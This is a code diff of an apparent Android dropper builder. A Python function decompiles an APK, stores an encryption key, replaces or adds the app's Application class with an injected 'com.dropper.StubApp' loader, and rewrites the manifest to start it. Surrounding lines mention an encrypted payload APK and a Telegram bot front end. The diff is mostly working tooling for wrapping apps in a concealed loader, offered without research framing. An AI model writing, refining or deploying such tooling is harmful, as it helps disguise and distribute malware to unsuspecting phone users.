@@ -190,7 +190,6 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
     encrypted_apk = os.path.join(TEMP_DIR, 'payload.apk.enc')
     ks_path = os.path.join(TEMP_DIR, 'rand.keystore')
 
-    # Decode original APK
     if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
         return False
 
@@ -208,29 +207,57 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
         with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
             f.write(key_hex)
 
-        # Remove original smali folders
-        for item in os.listdir(dec_dir):
-            if item.startswith('smali'):
-                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)
-
-        # Create new smali with our fixed classes
-        stub_dir = os.path.join(dec_dir, 'smali', 'com', 'dropper')
-        os.makedirs(stub_dir, exist_ok=True)
-        with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
-            f.write(STUB_APP)
-        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
-            f.write(STUB_UTIL)
-
-        # Modify manifest
+        # Read manifest to find original Application class name
         manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
         with open(manifest_path, 'r', encoding='utf-8') as f:
             manifest = f.read()
 
-        # Remove any existing android:name from application
+        app_class = None
+        app_match = re.search(r'<application[^>]*android:name="([^"]*)"', manifest)
+        if app_match:
+            app_class = app_match.group(1)
+            if app_class.startswith('.'):
+                # Not complete, need package name
+                package_name = re.search(r'package="([^"]+)"', manifest).group(1)
+                app_class = package_name + app_class
+
+        # Locate original Application smali if exists and replace it with StubApp
+        if app_class:
+            # Convert class name to file path: e.g. com.example.Main -> com/example/Main.smali
+            orig_class_path = app_class.replace('.', '/') + '.smali'
+            found = False
+            smali_dirs = [d for d in os.listdir(dec_dir) if d.startswith('smali')]
+            for smali_dir in smali_dirs:
+                orig_file = os.path.join(dec_dir, smali_dir, orig_class_path)
+                if os.path.exists(orig_file):
+                    with open(orig_file, 'w') as f:
+                        f.write(STUB_APP)
+                    found = True
+                    break
+            if not found:
+                # If original Application class not found (maybe it's in a library), we still add our StubApp to a separate smali path
+                stub_dir = os.path.join(dec_dir, 'smali', 'com', 'dropper')
+                os.makedirs(stub_dir, exist_ok=True)
+                with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
+                    f.write(STUB_APP)
+        else:
+            # No original Application class; add our StubApp in smali/com/dropper
+            stub_dir = os.path.join(dec_dir, 'smali', 'com', 'dropper')
+            os.makedirs(stub_dir, exist_ok=True)
+            with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
+                f.write(STUB_APP)
+
+        # Always add Util.smali in com/dropper
+        util_dir = os.path.join(dec_dir, 'smali', 'com', 'dropper')
+        os.makedirs(util_dir, exist_ok=True)
+        with open(os.path.join(util_dir, 'Util.smali'), 'w') as f:
+            f.write(STUB_UTIL)
+
+        # Modify manifest: set Application name to com.dropper.StubApp (if we replaced original, we still set name)
         manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
-        # Add our StubApp
         manifest = manifest.replace('<application', '<application android:name="com.dropper.StubApp"')
-        # Add FileProvider (required for Android 7+)
+
+        # Add FileProvider
         provider_entry = '''
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -278,7 +305,7 @@ def dropper_protect(input_apk: str, output_apk: str) -> bool:
             try: os.remove(f)
             except: pass
 
-# Telegram handlers
+# Telegram handlers (unchanged)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_allowed(update.effective_user.id):
         await update.message.reply_text("Access denied.")
